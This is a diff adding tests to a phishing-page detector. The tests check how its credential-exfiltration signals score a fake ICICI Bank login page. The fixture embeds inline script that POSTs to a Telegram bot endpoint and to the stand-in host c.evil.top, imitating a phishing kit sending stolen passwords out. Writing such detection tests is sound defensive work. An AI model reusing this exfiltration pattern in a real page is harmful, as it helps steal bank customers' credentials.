@@ -171,3 +171,38 @@ def test_host_phishing_interstitial_is_not_assessable_never_dismissed():
     assert r.verdict == "unreachable" and "interstitial" in r.signals[0].detail
     r = analyze_page(page(html, status=200), "x.pages.dev", None, {}, {}, None, None, now=NOW)
     assert r.verdict == "unreachable"
+
+
+# ---- S1/S2 behind the S3 gate: off by default; a strength only once the gate has run ----------------------------
+TG = "https://api.telegram.org/bot7012345678:AAH" + "x" * 32 + "/sendMessage"
+SPA = ("<html><head><title>ICICI Bank login</title></head><body><div id=app><input type=password name=p></div>"
+       f"<script>fetch('{TG}',{{method:'POST'}});fetch('https://c.evil.top/save',{{method:'POST'}})</script></body></html>")
+
+
+def test_exfil_signals_are_off_by_default():
+    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
+    assert not names(r) & {"credential_exfil_endpoint", "credential_post_foreign_origin_js"}
+
+
+def test_exfil_signals_at_strong_can_confirm_and_carry_their_evidence():
+    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
+                     signal_strengths={"exfil": "strong", "js_post": "strong"})
+    assert r.verdict == "confirmed" and r.strong_count == 2
+    ex = next(s for s in r.signals if s.name == "credential_exfil_endpoint")
+    assert "telegram_bot" in ex.detail and "rendered DOM" in ex.detail
+    js = next(s for s in r.signals if s.name == "credential_post_foreign_origin_js")
+    assert "https://c.evil.top" in js.detail
+
+
+def test_exfil_signals_at_moderate_never_confirm_alone():
+    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
+                     signal_strengths={"exfil": "moderate", "js_post": "moderate"})
+    assert r.verdict == "candidate" and r.strong_count == 0
+
+
+def test_one_exfil_endpoint_is_one_strong_signal_not_two():
+    """S1 and S2 must not double-count the same evidence: a Telegram POST alone is ONE strong signal."""
+    only_tg = SPA.replace("fetch('https://c.evil.top/save',{method:'POST'})", "")
+    r = analyze_page(page(only_tg), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
+                     signal_strengths={"exfil": "strong", "js_post": "strong"})
+    assert r.strong_count == 1 and r.verdict == "candidate"
